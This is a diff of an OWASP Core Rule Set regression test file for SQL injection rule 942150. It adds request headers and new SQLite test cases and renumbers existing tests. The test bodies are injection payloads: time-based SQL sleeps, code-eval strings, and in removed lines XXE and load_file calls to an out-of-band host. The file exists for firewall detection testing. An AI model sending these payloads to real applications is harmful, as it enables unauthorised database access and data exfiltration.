@@ -1,6 +1,6 @@
 ---
 meta:
-  author: "Christian Folini"
+  author: "Christian Folini,azurit"
   description: Various SQL injection tests
   enabled: true
   name: 942150.yaml
@@ -13,6 +13,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -28,6 +30,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -43,6 +47,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -58,6 +64,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -72,6 +80,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -80,17 +90,19 @@ tests:
           output:
             log_contains: id "942150"
   - test_title: 942150-6
-    desc: "Advanced SQL injection"
+    desc: "Simple SQL injection"
     stages:
       - stage:
           input:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
-            data: "var=foo'||(select extractvalue(xmltype('<?xml version=\"1.1\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % tocob SYSTEM \"https://unit'||'tests.coreruleset.org/\">%tocob;"
+            data: "var=config.ini' and sleep(91) #"
             version: HTTP/1.0
           output:
             log_contains: id "942150"
@@ -102,40 +114,46 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
-            method: POST
-            port: 80
-            uri: "/"
-            data: "var=config.ini' and sleep(91) #"
-            version: HTTP/1.0
-          output:
-            log_contains: id "942150"
-  - test_title: 942150-8
-    desc: "Simple SQL injection"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-            method: POST
-            port: 80
-            uri: "/"
-            data: "var=/config.txt' (select load_file('\\\\\\\\unittests.coreruleset.org\\\\zow')) '"
-            version: HTTP/1.0
-          output:
-            log_contains: id "942150"
-  - test_title: 942150-9
-    desc: "Simple SQL injection"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
             data: "var=None')and (select*from(select(sleep(10)))a)--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942150"
+  - test_title: 942150-8
+    desc: "Advanced SQL injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=eval(compile('for x in range(1):\\n import time\\n time.sleep(12)','a','single'))"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942150"
+  - test_title: 942150-9
+    desc: "Simple injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=file:/init.ini'.sleep(12).'"
             version: HTTP/1.0
           output:
             log_contains: id "942150"
@@ -147,36 +165,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
-            method: POST
-            port: 80
-            uri: "/"
-            data: "var=eval(compile('for x in range(1):\\n import time\\n time.sleep(12)','a','single'))"
-            version: HTTP/1.0
-          output:
-            log_contains: id "942150"
-  - test_title: 942150-11
-    desc: "Simple injection"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-            method: POST
-            port: 80
-            uri: "/"
-            data: "var=file:/init.ini'.sleep(12).'"
-            version: HTTP/1.0
-          output:
-            log_contains: id "942150"
-  - test_title: 942150-12
-    desc: "Advanced SQL injection"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -184,7 +174,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942150"
-  - test_title: 942150-13
+  - test_title: 942150-11
     desc: "Advanced SQL injection"
     stages:
       - stage:
@@ -192,21 +182,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
-            method: POST
-            port: 80
-            uri: "/"
-            data: "var=(select load_file('\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\unitests.corerule'||'set.org\\\\\\\\\\\\\\\\hvs'))"
-            version: HTTP/1.0
-          output:
-            log_contains: id "942150"
-  - test_title: 942150-14
-    desc: "Advanced SQL injection"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -214,7 +191,7 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942150"
-  - test_title: 942150-15
+  - test_title: 942150-12
     desc: "Simple injection"
     stages:
       - stage:
@@ -222,10 +199,63 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
             data: "var=${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942150"
+  - test_title: 942150-13
+    desc: "Simple injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=test{${sleep(12)}}"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942150"
+  - test_title: 942150-14
+    desc: "Advanced injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=test\"+eval(compile('for x in range(1):\\n import time\\n time.sleep(12)','a','single'))+\""
+            version: HTTP/1.0
+          output:
+            log_contains: id "942150"
+  - test_title: 942150-15
+    desc: "Advanced injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=test\"+(function(){if(typeof gs78r==='undefined'){var a=new Date();do{var b=new Date();}while(b-a<20000);gs78r=1;}}())+\""
             version: HTTP/1.0
           output:
             log_contains: id "942150"
@@ -237,55 +267,63 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
-            method: POST
-            port: 80
-            uri: "/"
-            data: "var=test{${sleep(12)}}"
-            version: HTTP/1.0
-          output:
-            log_contains: id "942150"
-  - test_title: 942150-17
-    desc: "Advanced injection"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-            method: POST
-            port: 80
-            uri: "/"
-            data: "var=test\"+eval(compile('for x in range(1):\\n import time\\n time.sleep(12)','a','single'))+\""
-            version: HTTP/1.0
-          output:
-            log_contains: id "942150"
-  - test_title: 942150-18
-    desc: "Advanced injection"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
-            method: POST
-            port: 80
-            uri: "/"
-            data: "var=test\"+(function(){if(typeof gs78r==='undefined'){var a=new Date();do{var b=new Date();}while(b-a<20000);gs78r=1;}}())+\""
-            version: HTTP/1.0
-          output:
-            log_contains: id "942150"
-  - test_title: 942150-19
-    desc: "Simple injection"
-    stages:
-      - stage:
-          input:
-            dest_addr: 127.0.0.1
-            headers:
-              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
             data: "var=\\foobar.txt\" or sleep(4) #"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942150"
+  - test_title: 942150-17
+    desc: "SQLite 'json' function"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "email=admin%40juice-sh.op%5C'%20or%20json%20(id);"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942150"
+  - test_title: 942150-18
+    desc: "SQLite 'json_valid' function"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "email=admin%40juice-sh.op%5C'%20or%20json_valid%20(id);"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942150"
+  - test_title: 942150-19
+    desc: "SQLite 'glob' function"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "email=admin%40juice-sh.op%5C'%20or%20glob%20(id,id);"
             version: HTTP/1.0
           output:
             log_contains: id "942150"
